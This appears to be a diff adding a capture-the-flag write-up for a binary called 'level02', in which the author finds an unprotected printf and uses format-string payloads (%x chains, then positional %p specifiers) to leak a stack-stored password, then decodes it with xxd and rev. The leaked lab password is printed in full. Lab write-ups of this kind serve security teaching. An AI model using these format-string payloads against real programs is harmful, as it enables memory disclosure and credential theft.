@@ -1,0 +1,43 @@
+This binary asks for a username and a password too.
+
+After decompiling it I discover that the password is set in a buffer.
+
+Later in the code, if strncmp(var1, var2, 41) == 0, it launches a shell but I cannot use this condition because I have no power on the content of the first argument.
+
+Later in the code I see an unprotected printf ! What can I do with an unprotected printf ? I can print memory.
+
+I said earlier that the password is set on a buffer that is on the stack.
+
+So let's try and print the password using printf:
+
+The arguemnt used in printf is the username argument.
+
+$ ./level02
+===== [ Secure Access System v1.0 ] =====
+/***************************************\
+| You must login to access this system. |
+\**************************************/
+--[ Username: %x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x
+--[ Password:
+*****************************************
+ffffe4a0002a2a2a2a2a2a2a2affffe698f7ff9a08000000000000003437684861733951574e67586e475873664b394d0782578257825782578257825782578257825782578257825 does not have access!
+
+In the middle of all that mess there seems to be a string looking like a password starting at %x no 22.
+The password is 40 characters long so as the groups 8 long the password is set in 5 groups.
+
+Let's print only the groups we want:
+
+$ ./level02
+===== [ Secure Access System v1.0 ] =====
+/***************************************\
+| You must login to access this system. |
+\**************************************/
+--[ Username: %26$p%25$p%24$p%23$p%22$p
+--[ Password:
+*****************************************
+0x48336750664b394d0x354a35686e4758730x377a7143574e67580x45414a35617339510x756e505234376848 does not have access!
+
+Okay this really does look like a password, lets remove the 0x, convert to ASCII and revert the endian:
+
+echo 0x48336750664b394d0x354a35686e4758730x377a7143574e67580x45414a35617339510x756e505234376848 | xxd -r -p | rev
+Hh74RPnuQ9sa5JAEXgNWCqz7sXGnh5J5M9KfPg3H
